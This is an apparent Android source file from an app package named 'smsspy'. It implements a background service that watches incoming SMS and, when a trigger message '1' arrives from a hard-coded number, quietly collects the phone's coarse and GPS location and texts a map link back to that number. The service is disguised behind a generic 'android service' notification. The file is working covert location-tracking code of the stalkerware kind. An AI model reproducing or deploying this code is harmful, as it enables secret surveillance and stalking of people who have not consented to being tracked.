package com.dcodestar.smsspy;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.TabHost;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import java.security.Provider;

public class BroadcastReceiverService extends Service {
    private static final String TAG = "BroadcastReceiverServic";

    private String number= Constants.number;
    private static BroadcastReceiver broadcastReceiver;
    private Notification notification;
    private int notificationId;
    private NotificationManagerCompat notificationManagerCompat;
    private FusedLocationProviderClient fusedLocationProviderClient;
    private LocationRequest locationRequest;
    private LocationCallback locationCallback;
    private LocationManager locationManager;
    private Location fusedLocation,fineLocation;
    LocationListener locationListener;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        notificationId=1;
        notificationManagerCompat=NotificationManagerCompat.from(this);
        notification= new NotificationCompat.Builder(this, App.CHANNEL_ID_1)
                .setContentTitle("android service")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setAutoCancel(false)
                .setPriority(NotificationManager.IMPORTANCE_DEFAULT)
                .build();

        fusedLocationProviderClient= LocationServices.getFusedLocationProviderClient(this);
        locationManager=(LocationManager)getSystemService(Context.LOCATION_SERVICE);
        locationListener=new LocationListener() {
            @Override
            public void onLocationChanged(Location loc) {
                Log.d(TAG, "onLocationChanged: update came");
                fineLocation=loc;
                locationManager.removeUpdates(locationListener);
                if(fineLocation!=null){
                    sendLocation(fineLocation,"fine");
                }
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
                Log.d(TAG, "onStatusChanged: changed");
            }

            @Override
            public void onProviderEnabled(String provider) {
                Log.d(TAG, "onProviderEnabled: true");
            }

            @Override
            public void onProviderDisabled(String provider) {
                Log.d(TAG, "onProviderDisabled: true");
            }
        };
    }

    @Override
    public void onDestroy() {
        unregisterReceiver(broadcastReceiver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(notificationId,notification);
        registerBroadcastReceiver();
        return super.onStartCommand(intent, flags, startId);
    }

    private void registerBroadcastReceiver(){
        broadcastReceiver=new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d(TAG, "onReceive: broadcast received");
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[])bundle.get("pdus");
                    final SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                    }
                    if (messages.length > -1) {
                        Log.d(TAG, "onReceive: "+messages[0].getOriginatingAddress());
                        if(messages[0].getOriginatingAddress().equals(number)&&messages[0].getDisplayMessageBody().equals("1")){
                            getFusedLocation();
                            getFineLocation();
                        }
//                        SmsManager.getDefault().sendTextMessage(messages[0].getOriginatingAddress(),null,"hi",null,null);
                    }
                }
            }
        };
        IntentFilter filter=new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(broadcastReceiver,filter);
    }
    private void sendLocation(Location location,String type){
        double lat = location.getLatitude();
        double lon = location.getLongitude();
        String header="Location is "+type+"\n";
        String message="http://maps.google.com/maps?q="+lat+","+lon;
        SmsManager smsManager = SmsManager.getDefault();
        StringBuffer smsBody = new StringBuffer();
        smsBody.append(header);
        smsBody.append(Uri.parse(message));
        smsManager.sendTextMessage(number, null, smsBody.toString(), null,null);
    }
    private void getFusedLocation(){
        fusedLocation=null;
        fusedLocationProviderClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
            @Override
            public void onSuccess(Location location1) {
                Log.d(TAG, "onSuccess: from fused client");
                fusedLocation=location1;
                if(fusedLocation!=null)
                    sendLocation(fusedLocation,"coarse");
            }
        });
    }
    private void getFineLocation(){
        fineLocation=null;
        if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
            if(ContextCompat.checkSelfPermission(this,Manifest.permission.ACCESS_FINE_LOCATION)==PackageManager.PERMISSION_GRANTED)
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,0,0,locationListener);
        }
    }
}
